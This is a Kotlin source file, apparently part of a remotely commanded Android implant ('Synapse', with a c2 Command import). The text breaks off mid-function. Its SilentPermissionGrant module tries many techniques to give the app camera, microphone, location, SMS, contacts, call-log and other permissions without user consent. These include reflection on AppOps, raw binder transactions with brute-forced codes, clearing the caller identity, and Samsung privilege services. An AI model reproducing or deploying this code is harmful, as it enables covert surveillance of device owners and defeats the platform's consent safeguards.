package org.synapse.core.modules

import android.app.AppOpsManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.os.Process
import android.os.UserHandle
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import java.io.BufferedReader
import java.io.InputStreamReader
import java.lang.reflect.Method

object SilentPermissionGrant {

    private const val TAG = "Synapse.SilentGrant"

    private val DEFAULT_TARGET_PERMISSIONS = listOf(
        "android.permission.CAMERA",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_PHONE_STATE",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.BODY_SENSORS",
        "android.permission.ACTIVITY_RECOGNITION",
        "android.permission.READ_CALENDAR",
        "android.permission.WRITE_CALENDAR"
    )

    // Permissions that CANNOT be granted programmatically (require user interaction via Settings)
    private val UNGRANTABLE_PERMISSIONS = setOf(
        "android.permission.SYSTEM_ALERT_WINDOW",   // Needs Settings.ACTION_MANAGE_OVERLAY_PERMISSION
        "android.permission.REQUEST_INSTALL_PACKAGES" // Needs Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES
    )

    // ── Permission → AppOps op-string mapping (Android 12+ format: "android:<short>") ──
    private val PERM_TO_OPSTR = mapOf(
        "android.permission.CAMERA" to listOf("android:camera", "CAMERA", "OP_CAMERA"),
        "android.permission.ACCESS_FINE_LOCATION" to listOf("android:fine_location", "FINE_LOCATION", "OP_FINE_LOCATION"),
        "android.permission.ACCESS_COARSE_LOCATION" to listOf("android:coarse_location", "COARSE_LOCATION", "OP_COARSE_LOCATION"),
        "android.permission.RECORD_AUDIO" to listOf("android:record_audio", "RECORD_AUDIO", "OP_RECORD_AUDIO"),
        "android.permission.READ_EXTERNAL_STORAGE" to listOf("android:read_external_storage", "READ_EXTERNAL_STORAGE"),
        "android.permission.WRITE_EXTERNAL_STORAGE" to listOf("android:write_external_storage", "WRITE_EXTERNAL_STORAGE"),
        "android.permission.READ_MEDIA_IMAGES" to listOf("android:read_media_images", "READ_MEDIA_IMAGES"),
        "android.permission.READ_MEDIA_VIDEO" to listOf("android:read_media_video", "READ_MEDIA_VIDEO"),
        "android.permission.READ_MEDIA_AUDIO" to listOf("android:read_media_audio", "READ_MEDIA_AUDIO"),
        "android.permission.READ_SMS" to listOf("android:read_sms", "READ_SMS", "OP_READ_SMS"),
        "android.permission.SEND_SMS" to listOf("android:send_sms", "SEND_SMS", "OP_SEND_SMS"),
        "android.permission.RECEIVE_SMS" to listOf("android:receive_sms", "RECEIVE_SMS", "OP_RECEIVE_SMS"),
        "android.permission.READ_CONTACTS" to listOf("android:read_contacts", "READ_CONTACTS", "OP_READ_CONTACTS"),
        "android.permission.READ_CALL_LOG" to listOf("android:read_call_log", "READ_CALL_LOG", "OP_READ_CALL_LOG"),
        "android.permission.READ_PHONE_STATE" to listOf("android:read_phone_state", "READ_PHONE_STATE", "OP_READ_PHONE_STATE"),
        "android.permission.POST_NOTIFICATIONS" to listOf("android:post_notification", "POST_NOTIFICATIONS", "OP_POST_NOTIFICATION"),
        "android.permission.ACCESS_BACKGROUND_LOCATION" to listOf("android:background_location", "OP_BACKGROUND_LOCATION", "android:fine_location"),
        "android.permission.BODY_SENSORS" to listOf("android:body_sensors", "BODY_SENSORS", "OP_BODY_SENSORS"),
        "android.permission.ACTIVITY_RECOGNITION" to listOf("android:activity_recognition", "ACTIVITY_RECOGNITION", "OP_ACTIVITY_RECOGNITION"),
        "android.permission.READ_CALENDAR" to listOf("android:read_calendar", "READ_CALENDAR", "OP_READ_CALENDAR"),
        "android.permission.WRITE_CALENDAR" to listOf("android:write_calendar", "WRITE_CALENDAR", "OP_WRITE_CALENDAR"),
        "android.permission.SYSTEM_ALERT_WINDOW" to listOf("android:system_alert_window", "SYSTEM_ALERT_WINDOW"),
        "android.permission.REQUEST_INSTALL_PACKAGES" to listOf("android:request_install_packages", "REQUEST_INSTALL_PACKAGES"),
    )

    // ── Result tracking ───────────────────────────────────────────────────────
    data class TechniqueResult(
        val technique: String,
        val permsGranted: MutableSet<String> = mutableSetOf(),
        val permsFailed: MutableSet<String> = mutableSetOf(),
        var error: String? = null,
        val details: MutableMap<String, String> = mutableMapOf()
    )

    // ═══════════════════════════════════════════════════════════════════════════
    // Main entry point
    // ═══════════════════════════════════════════════════════════════════════════

    suspend fun grant(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        val requested: List<String> = cmd.params["permissions"]
            ?.split(",")?.map { it.trim() }?.filter { it.isNotEmpty() }
            ?: DEFAULT_TARGET_PERMISSIONS

        val pkgName = context.packageName
        val uid = Process.myUid()
        val userId = uid / 100000

        val before = checkPermissionStates(context, requested)
        Log.d(TAG, "=== Starting silent permission grant ===")
        Log.d(TAG, "Package: $pkgName  UID: $uid  UserID: $userId")
        Log.d(TAG, "Before: granted=${before.count { it.value }}/${requested.size}")

        val allResults = mutableListOf<TechniqueResult>()
        val remainingAtStart = requested.filter { before[it] != true }.toMutableSet()

        // Cap total grant time at 15s to prevent WebSocket timeout.
        // If timeout hits, return whatever we've granted so far.
        val timedOut = withTimeoutOrNull(15_000L) {

        // ── Technique 1: AppOpsManager.setUidMode via reflection ──────────
        if (remainingAtStart.isNotEmpty()) {
            val r = tryAppOpsSetUidMode(context, remainingAtStart, uid)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After AppOps.setUidMode: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 2: AppOpsService binder direct ─────────────────────
        if (remainingAtStart.isNotEmpty()) {
            val r = tryAppOpsServiceBinder(remainingAtStart, uid, pkgName)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After AppOps binder: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 3: PackageManager.grantRuntimePermission via reflection ──
        if (remainingAtStart.isNotEmpty()) {
            val r = tryPmReflection(context, remainingAtStart)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After PM reflection: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 4: IPackageManager.grantRuntimePermission via binder ──
        if (remainingAtStart.isNotEmpty()) {
            val r = tryPackageManagerBinder(remainingAtStart, pkgName, userId)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After IPackageManager binder: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 5: IPermissionManager.grantRuntimePermission via binder ──
        if (remainingAtStart.isNotEmpty()) {
            val r = tryPermissionManagerBinder(remainingAtStart, pkgName, userId)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After IPermissionManager binder: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 6: Samsung semprivilege ────────────────────────────
        if (remainingAtStart.isNotEmpty()) {
            val r = trySamsungSemPrivilege(remainingAtStart, pkgName, uid)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After semprivilege: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 7: Samsung application_policy ──────────────────────
        if (remainingAtStart.isNotEmpty()) {
            val r = trySamsungAppPolicy(remainingAtStart, pkgName, uid)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After application_policy: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 8: Samsung enterprise_policy ───────────────────────
        if (remainingAtStart.isNotEmpty()) {
            val r = trySamsungEnterprisePolicy(remainingAtStart, pkgName, uid)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After enterprise_policy: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 9: Shell pm grant ──────────────────────────────────
        if (remainingAtStart.isNotEmpty()) {
            val r = tryShellPmGrant(remainingAtStart, pkgName)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After shell pm grant: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 10: Shell appops set ───────────────────────────────
        if (remainingAtStart.isNotEmpty()) {
            val r = tryShellAppOpsSet(remainingAtStart, pkgName, uid)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After shell appops set: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 11: Direct AppOps with hardcoded OP codes ──────────
        // Specific to permissions that need numeric OP codes (storage, body, calendar, activity)
        if (remainingAtStart.isNotEmpty()) {
            val r = tryAppOpsHardcodedCodes(context, remainingAtStart, uid, pkgName)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After AppOps hardcoded: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        // ── Technique 12: SmsManager reflection for SMS permissions ─────
        if (remainingAtStart.isNotEmpty()) {
            val smsPerms = remainingAtStart.filter {
                it.contains("SMS", ignoreCase = true)
            }
            if (smsPerms.isNotEmpty()) {
                val r = trySmsManagerGrant(context, smsPerms.toSet(), uid)
                recordNewGrants(context, remainingAtStart, r)
                allResults.add(r)
                Log.d(TAG, "After SmsManager: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
            }
        }

        // ── Technique 13: Telephony/ISmsService binder for SMS ──────────
        if (remainingAtStart.isNotEmpty()) {
            val smsPerms = remainingAtStart.filter {
                it.contains("SMS", ignoreCase = true)
            }
            if (smsPerms.isNotEmpty()) {
                val r = tryTelephonySmsBinder(smsPerms.toSet(), pkgName, uid)
                recordNewGrants(context, remainingAtStart, r)
                allResults.add(r)
                Log.d(TAG, "After Telephony SMS binder: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
            }
        }

        // ── Technique 14: Samsung semclipboard for clipboard-related ─────
        if (remainingAtStart.isNotEmpty()) {
            val r = trySamsungSemClipboardPerm(remainingAtStart, pkgName, uid)
            recordNewGrants(context, remainingAtStart, r)
            allResults.add(r)
            Log.d(TAG, "After semclipboard: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
        }

        } // end withTimeoutOrNull
        if (timedOut == null) {
            Log.w(TAG, "=== Silent grant TIMED OUT after 15s — returning partial results ===")
        }

        val after = checkPermissionStates(context, requested)
        val granted = requested.filter { after[it] == true }
        // Mark un-grantable permissions as documented limits, not failures
        val failed = requested.filter { after[it] != true && it !in UNGRANTABLE_PERMISSIONS }
        val skipped = requested.filter { it in UNGRANTABLE_PERMISSIONS }

        // Build detailed technique results
        val detailsParts = allResults.map { r ->
            val perms = if (r.permsGranted.isNotEmpty()) r.permsGranted.joinToString(",") { it.split(".").last() } else "none"
            val err = r.error?.let { "($it)" } ?: ""
            "${r.technique}: $perms$err"
        }

        Log.d(TAG, "=== Silent grant complete: granted=${granted.size}, failed=${failed.size}, skipped=${skipped.size} ===")

        SynapseResponse.PermissionGrantResponse(
            target_permissions = requested,
            granted = granted,
            failed = failed + skipped.map { "$it [requires_user_interaction]" },
            details = detailsParts.joinToString(" | ") +
                (if (skipped.isNotEmpty()) " | SKIPPED: ${skipped.joinToString(",") { it.split(".").last() }}" else "")
        )
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Permission state helpers
    // ═══════════════════════════════════════════════════════════════════════════

    private fun checkPermissionStates(context: Context, permissions: Iterable<String>): Map<String, Boolean> {
        return permissions.associateWith { perm ->
            try {
                context.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
            } catch (_: Exception) { false }
        }
    }

    private fun recordNewGrants(context: Context, remaining: MutableSet<String>, result: TechniqueResult) {
        val newlyGranted = remaining.filter {
            try { context.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED } catch (_: Exception) { false }
        }.toSet()
        result.permsGranted.addAll(newlyGranted)
        remaining.removeAll(newlyGranted)
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // ServiceManager helper
    // ═══════════════════════════════════════════════════════════════════════════

    private fun getBinderService(name: String): IBinder? {
        return try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            getService.invoke(null, name) as? IBinder
        } catch (e: Exception) {
            Log.d(TAG, "getBinderService($name): ${e.message}")
            null
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // Stub class transaction code discovery via reflection
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Given a stub class name (e.g. "android.content.pm.IPackageManager$Stub"),
     * find the TRANSACTION_* field matching [methodNameHint] (partial match).
     * Returns the transaction code or -1.
     */
    private fun findTransactionCode(stubClassName: String, methodNameHint: String): Int {
        return try {
            val stubClass = Class.forName(stubClassName)
            for (field in stubClass.declaredFields) {
                if (field.name.startsWith("TRANSACTION_") &&
                    field.name.contains(methodNameHint, ignoreCase = true)) {
                    field.isAccessible = true
                    val code = field.getInt(null)
                    Log.d(TAG, "Found $stubClassName.${field.name} = $code")
                    return code
                }
            }
            -1
        } catch (e: Exception) {
            Log.d(TAG, "Cannot find tx code in $stubClassName for $methodNameHint: ${e.message}")
            -1
        }
    }

    /**
     * Find all TRANSACTION_* fields in a stub class and return as name→code map.
     */
    private fun findAllTransactionCodes(stubClassName: String): Map<String, Int> {
        return try {
            val stubClass = Class.forName(stubClassName)
            stubClass.declaredFields
                .filter { it.name.startsWith("TRANSACTION_") }
                .associate { field ->
                    field.isAccessible = true
                    field.name to field.getInt(null)
                }
        } catch (_: Exception) {
            emptyMap()
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 1: AppOpsManager.setUidMode via reflection
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryAppOpsSetUidMode(context: Context, permissions: Set<String>, uid: Int): TechniqueResult {
        val result = TechniqueResult("appops_setuidmode")
        result.details["uid"] = uid.toString()

        try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val appOpsClass = appOps.javaClass

            // Try to find setUidMode method — signatures vary by Android version
            val methods = appOpsClass.declaredMethods.filter {
                it.name == "setUidMode" || it.name == "setMode"
            }

            for (perm in permissions) {
                val opStrs = PERM_TO_OPSTR[perm] ?: continue
                for (opStr in opStrs) {
                    var permSet = false
                    for (method in methods) {
                        try {
                            method.isAccessible = true
                            val paramTypes = method.parameterTypes
                            val token = Binder.clearCallingIdentity()
                            try {
                                when {
                                    // setUidMode(String op, int uid, int mode) — Android 11+
                                    method.name == "setUidMode" && paramTypes.size == 3 &&
                                        paramTypes[0] == String::class.java &&
                                        paramTypes[1] == Int::class.javaPrimitiveType &&
                                        paramTypes[2] == Int::class.javaPrimitiveType -> {
                                        method.invoke(appOps, opStr, uid, AppOpsManager.MODE_ALLOWED)
                                        permSet = true
                                    }
                                    // setUidMode(int code, int uid, int mode) — older
                                    method.name == "setUidMode" && paramTypes.size == 3 &&
                                        paramTypes[0] == Int::class.javaPrimitiveType -> {
                                        val opCode = tryGetOpCode(appOpsClass, opStr)
                                        if (opCode >= 0) {
                                            method.invoke(appOps, opCode, uid, AppOpsManager.MODE_ALLOWED)
                                            permSet = true
                                        }
                                    }
                                    // setMode(int code, int uid, String pkg, int mode)
                                    method.name == "setMode" && paramTypes.size == 4 &&
                                        paramTypes[0] == Int::class.javaPrimitiveType &&
                                        paramTypes[1] == Int::class.javaPrimitiveType &&
                                        paramTypes[2] == String::class.java -> {
                                        val opCode = tryGetOpCode(appOpsClass, opStr)
                                        if (opCode >= 0) {
                                            method.invoke(appOps, opCode, uid, "org.synapse.core", AppOpsManager.MODE_ALLOWED)
                                            permSet = true
                                        }
                                    }
                                    // setMode(int code, int uid, String pkg, int mode, boolean override) — Android 14+
                                    method.name == "setMode" && paramTypes.size == 5 -> {
                                        val opCode = tryGetOpCode(appOpsClass, opStr)
                                        if (opCode >= 0) {
                                            method.invoke(appOps, opCode, uid, "org.synapse.core", AppOpsManager.MODE_ALLOWED, java.lang.Boolean.TRUE)
                                            permSet = true
                                        }
                                    }
                                }
                            } finally {
                                Binder.restoreCallingIdentity(token)
                            }
                            if (permSet) break
                        } catch (e: Exception) {
                            // Try next method signature
                        }
                    }
                    if (permSet) {
                        result.permsGranted.add(perm)
                        result.details[perm] = "setUidMode_$opStr"
                        break
                    }
                }
                if (perm !in result.permsGranted) {
                    result.permsFailed.add(perm)
                }
            }
        } catch (e: Exception) {
            result.error = "AppOpsManager error: ${e.message}"
        }

        if (result.error == null) {
            result.details["status"] = "called_no_exception"
        }
        return result
    }

    private fun tryGetOpCode(appOpsClass: Class<*>, opStr: String): Int {
        return try {
            // Try strOpToOp(String)
            val m = appOpsClass.getDeclaredMethod("strOpToOp", String::class.java)
            m.isAccessible = true
            (m.invoke(null, opStr) as? Int) ?: -1
        } catch (_: Exception) {
            try {
                // Try getting OP_ field directly
                val fieldName = "OP_${opStr.uppercase().replace(":", "_")}"
                val f = appOpsClass.getDeclaredField(fieldName)
                f.isAccessible = true
                f.getInt(null)
            } catch (_: Exception) {
                -1
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 2: AppOpsService binder direct (bypasses AppOpsManager checks)
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryAppOpsServiceBinder(permissions: Set<String>, uid: Int, pkgName: String): TechniqueResult {
        val result = TechniqueResult("appops_binder")

        val binder = getBinderService("appops")
        if (binder == null) {
            result.error = "appops service not found"
            return result
        }

        val descriptor = "com.android.internal.app.IAppOpsService"
        val txCodes = findAllTransactionCodes("com.android.internal.app.IAppOpsService\$Stub")
        result.details["found_tx_codes"] = txCodes.keys.joinToString(",")

        // Look for setUidMode, setMode transaction codes
        val relevantTxCodes = txCodes.filterKeys { k ->
            k.contains("SET_UID_MODE", ignoreCase = true) ||
            k.contains("SET_MODE", ignoreCase = true)
        }

        if (relevantTxCodes.isEmpty()) {
            // Fallback: try transaction codes 1..80 for setMode-like methods
            result.details["tx_discovery"] = "fallback_range"
            tryAppOpsBinderFallback(binder, descriptor, permissions, uid, pkgName, result)
        } else {
            for ((txName, txCode) in relevantTxCodes) {
                tryAppOpsBinderTx(binder, descriptor, txCode, txName, permissions, uid, pkgName, result)
            }
        }

        return result
    }

    private fun tryAppOpsBinderTx(
        binder: IBinder, descriptor: String, txCode: Int, txName: String,
        permissions: Set<String>, uid: Int, pkgName: String, result: TechniqueResult
    ) {
        for (perm in permissions) {
            val opStrs = PERM_TO_OPSTR[perm] ?: continue
            for (opStr in opStrs) {
                val data = Parcel.obtain(); val reply = Parcel.obtain()
                try {
                    data.writeInterfaceToken(descriptor)
                    // Try multiple Parcel formats
                    val formats = listOf(
                        // Format A: setUidMode(String op, int uid, int mode)
                        { data.writeString(opStr); data.writeInt(uid); data.writeInt(AppOpsManager.MODE_ALLOWED) },
                        // Format B: setUidMode(IBinder token, int uid, String pkg, String op, int mode)
                        { data.writeStrongBinder(null); data.writeInt(uid); data.writeString(pkgName); data.writeString(opStr); data.writeInt(AppOpsManager.MODE_ALLOWED) },
                        // Format C: setMode(int code, int uid, String pkg, int mode)
                        { data.writeInt(tryGetOpCodeHardcoded(opStr)); data.writeInt(uid); data.writeString(pkgName); data.writeInt(AppOpsManager.MODE_ALLOWED) },
                    )

                    for ((fmtIdx, writeArgs) in formats.withIndex()) {
                        data.setDataPosition(0); reply.setDataPosition(0)
                        data.writeInterfaceToken(descriptor)
                        writeArgs()

                        val token = Binder.clearCallingIdentity()
                        try {
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                                result.details["${perm.split(".").last()}_${txName}_fmt${fmtIdx}"] = "ok"
                            }
                        } catch (e: Exception) {
                            result.details["${perm.split(".").last()}_${txName}_fmt${fmtIdx}"] = "err:${e.message}"
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    }
                } catch (_: Exception) {
                } finally {
                    data.recycle(); reply.recycle()
                }
            }
        }
    }

    private fun tryAppOpsBinderFallback(
        binder: IBinder, descriptor: String,
        permissions: Set<String>, uid: Int, pkgName: String, result: TechniqueResult
    ) {
        for (perm in permissions) {
            val opStrs = PERM_TO_OPSTR[perm] ?: continue
            for (opStr in opStrs) {
                for (txCode in 1..8) {
                    val data = Parcel.obtain(); val reply = Parcel.obtain()
                    try {
                        data.writeInterfaceToken(descriptor)
                        data.writeString(opStr); data.writeInt(uid); data.writeInt(AppOpsManager.MODE_ALLOWED)
                        val token = Binder.clearCallingIdentity()
                        try {
                            if (binder.transact(txCode, data, reply, 0)) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                            }
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    } catch (_: Exception) {
                    } finally {
                        data.recycle(); reply.recycle()
                    }
                }
            }
        }
        result.details["fallback"] = "tried_tx_1_to_8"
    }

    private fun tryGetOpCodeHardcoded(opStr: String): Int {
        return when (opStr) {
            "android:camera", "CAMERA" -> 26
            "android:fine_location", "FINE_LOCATION" -> 0
            "android:coarse_location", "COARSE_LOCATION" -> 1
            "android:record_audio", "RECORD_AUDIO" -> 27
            "android:read_external_storage" -> 59
            "android:write_external_storage" -> 60
            "android:read_sms", "READ_SMS" -> 14
            "android:send_sms", "SEND_SMS" -> 15
            "android:receive_sms", "RECEIVE_SMS" -> 16
            "android:read_contacts", "READ_CONTACTS" -> 4
            "android:read_call_log", "READ_CALL_LOG" -> 6
            "android:read_phone_state", "READ_PHONE_STATE" -> 51
            "android:post_notification" -> 11
            "android:body_sensors" -> 56
            "android:activity_recognition" -> 79
            "android:read_calendar" -> 8
            "android:write_calendar" -> 9
            else -> -1
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 3: IPackageManager.grantRuntimePermission via ServiceManager
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryPackageManagerBinder(permissions: Set<String>, pkgName: String, userId: Int): TechniqueResult {
        val result = TechniqueResult("package_manager_binder")

        val binder = getBinderService("package")
        if (binder == null) {
            result.error = "package service not found"
            return result
        }

        val txCode = findTransactionCode(
            "android.content.pm.IPackageManager\$Stub",
            "GRANT_RUNTIME_PERMISSION"
        )

        if (txCode < 0) {
            // Fallback: try commonly known codes
            result.details["tx_discovery"] = "fallback"
            result.error = "TRANSACTION_grantRuntimePermission not found via reflection"
            tryPmBinderFallback(binder, permissions, pkgName, userId, result)
            return result
        }

        result.details["tx_code"] = txCode.toString()
        val descriptor = "android.content.pm.IPackageManager"

        for (perm in permissions) {
            val data = Parcel.obtain(); val reply = Parcel.obtain()
            try {
                data.writeInterfaceToken(descriptor)
                data.writeString(pkgName)
                data.writeString(perm)
                data.writeInt(userId)

                val token = Binder.clearCallingIdentity()
                try {
                    val ok = binder.transact(txCode, data, reply, 0)
                    if (ok) {
                        reply.setDataPosition(0)
                        try {
                            reply.readException()
                            result.details[perm.split(".").last()] = "no_exception"
                        } catch (e: Exception) {
                            result.details[perm.split(".").last()] = "exception:${e.message}"
                        }
                    }
                } finally {
                    Binder.restoreCallingIdentity(token)
                }
            } catch (e: Exception) {
                result.details[perm.split(".").last()] = "error:${e.message}"
            } finally {
                data.recycle(); reply.recycle()
            }
        }

        return result
    }

    private fun tryPmBinderFallback(
        binder: IBinder, permissions: Set<String>, pkgName: String, userId: Int,
        result: TechniqueResult
    ) {
        val descriptor = "android.content.pm.IPackageManager"
        // Try transaction codes in range 60-67 (grantRuntimePermission is late in AIDL)
        for (txCode in 60..67) {
            for (perm in permissions) {
                val data = Parcel.obtain(); val reply = Parcel.obtain()
                try {
                    data.writeInterfaceToken(descriptor)
                    data.writeString(pkgName)
                    data.writeString(perm)
                    data.writeInt(userId)
                    val token = Binder.clearCallingIdentity()
                    try {
                        if (binder.transact(txCode, data, reply, 0)) {
                            reply.setDataPosition(0)
                            try { reply.readException() } catch (_: Exception) {}
                        }
                    } finally {
                        Binder.restoreCallingIdentity(token)
                    }
                } catch (_: Exception) {
                } finally {
                    data.recycle(); reply.recycle()
                }
            }
        }
        result.details["fallback"] = "tried_tx_60_to_67"
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 4: IPermissionManager.grantRuntimePermission via ServiceManager
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryPermissionManagerBinder(permissions: Set<String>, pkgName: String, userId: Int): TechniqueResult {
        val result = TechniqueResult("permission_manager_binder")

        // Try multiple service names
        var binder: IBinder? = null
        var serviceName = ""
        for (name in listOf("permission", "permissionmgr", "permission_mgr")) {
            binder = getBinderService(name)
            if (binder != null) {
                serviceName = name
                break
            }
        }

        if (binder == null) {
            result.error = "permission service not found"
            return result
        }

        result.details["service"] = serviceName

        // Try to find transaction code via multiple stub class names
        val stubClasses = listOf(
            "android.permission.IPermissionManager\$Stub",
            "android.permission.PermissionManager\$Stub",
        )

        var txCode = -1
        for (stubClass in stubClasses) {
            txCode = findTransactionCode(stubClass, "GRANT_RUNTIME_PERMISSION")
            if (txCode >= 0) break
        }

        if (txCode < 0) {
            result.error = "TRANSACTION_grantRuntimePermission not found"
            return result
        }

        result.details["tx_code"] = txCode.toString()
        val descriptor = "android.permission.IPermissionManager"

        for (perm in permissions) {
            val data = Parcel.obtain(); val reply = Parcel.obtain()
            try {
                data.writeInterfaceToken(descriptor)
                data.writeString(pkgName)
                data.writeString(perm)
                data.writeInt(userId)

                val token = Binder.clearCallingIdentity()
                try {
                    val ok = binder.transact(txCode, data, reply, 0)
                    if (ok) {
                        reply.setDataPosition(0)
                        try {
                            reply.readException()
                            result.details[perm.split(".").last()] = "no_exception"
                        } catch (e: Exception) {
                            result.details[perm.split(".").last()] = "exception:${e.message}"
                        }
                    }
                } finally {
                    Binder.restoreCallingIdentity(token)
                }
            } catch (e: Exception) {
                result.details[perm.split(".").last()] = "error:${e.message}"
            } finally {
                data.recycle(); reply.recycle()
            }
        }

        return result
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 5: Samsung semprivilege
    // ═══════════════════════════════════════════════════════════════════════════

    private fun trySamsungSemPrivilege(permissions: Set<String>, pkgName: String, uid: Int): TechniqueResult {
        val result = TechniqueResult("semprivilege")

        val binder = getBinderService("semprivilege")
        if (binder == null) {
            result.error = "service not found"
            return result
        }

        // Try to find Stub class and transaction codes
        val stubClasses = listOf(
            "com.samsung.android.privilege.IPrivilegeManager\$Stub",
            "com.samsung.android.semprivilege.IPrivilegeManager\$Stub",
        )

        var allTxCodes: Map<String, Int> = emptyMap()
        for (stubClass in stubClasses) {
            allTxCodes = findAllTransactionCodes(stubClass)
            if (allTxCodes.isNotEmpty()) break
        }

        val descriptors = listOf(
            "com.samsung.android.privilege.IPrivilegeManager",
            "com.samsung.android.semprivilege.IPrivilegeManager",
        )

        if (allTxCodes.isNotEmpty()) {
            result.details["found_tx"] = allTxCodes.keys.joinToString(",")
            // Try relevant transaction codes
            val relevantTx = allTxCodes.filterKeys { k ->
                k.contains("ADD", ignoreCase = true) ||
                k.contains("GRANT", ignoreCase = true) ||
                k.contains("PRIVILEGE", ignoreCase = true) ||
                k.contains("SET", ignoreCase = true) ||
                k.contains("ENABLE", ignoreCase = true) ||
                k.contains("ALLOW", ignoreCase = true)
            }

            for ((txName, txCode) in relevantTx) {
                trySemPrivilegeTx(binder, descriptors, txCode, txName, permissions, pkgName, uid, result)
            }

            // If no relevant tx found, try all
            if (relevantTx.isEmpty()) {
                for ((txName, txCode) in allTxCodes) {
                    trySemPrivilegeTx(binder, descriptors, txCode, txName, permissions, pkgName, uid, result)
                }
            }
        } else {
            // Fallback: brute force tx 1..5
            result.details["tx_discovery"] = "fallback_range"
            for (txCode in 1..5) {
                trySemPrivilegeTx(binder, descriptors, txCode, "TX_$txCode", permissions, pkgName, uid, result)
            }
        }

        return result
    }

    private fun trySemPrivilegeTx(
        binder: IBinder, descriptors: List<String>, txCode: Int, txName: String,
        permissions: Set<String>, pkgName: String, uid: Int, result: TechniqueResult
    ) {
        for (perm in permissions) {
            for (desc in descriptors) {
                val data = Parcel.obtain(); val reply = Parcel.obtain()
                try {
                    // Try multiple Parcel formats
                    val formats = listOf(
                        // Format A: addPrivilegedApp(packageName, privilegeName)
                        { data.writeString(pkgName); data.writeString(perm) },
                        // Format B: addPrivilegedApp(packageName, privilegeName, uid)
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(uid) },
                        // Format C: setPrivilege(packageName, privilegeName, enabled)
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(1) },
                        // Format D: addPrivilegedApp(uid, packageName, privilegeName)
                        { data.writeInt(uid); data.writeString(pkgName); data.writeString(perm) },
                        // Format E: grantPrivilege(packageName, privilegeName, userId)
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(uid / 100000) },
                    )

                    for ((fmtIdx, writeArgs) in formats.withIndex()) {
                        data.setDataPosition(0); reply.setDataPosition(0)
                        data.writeInterfaceToken(desc)
                        writeArgs()

                        val token = Binder.clearCallingIdentity()
                        try {
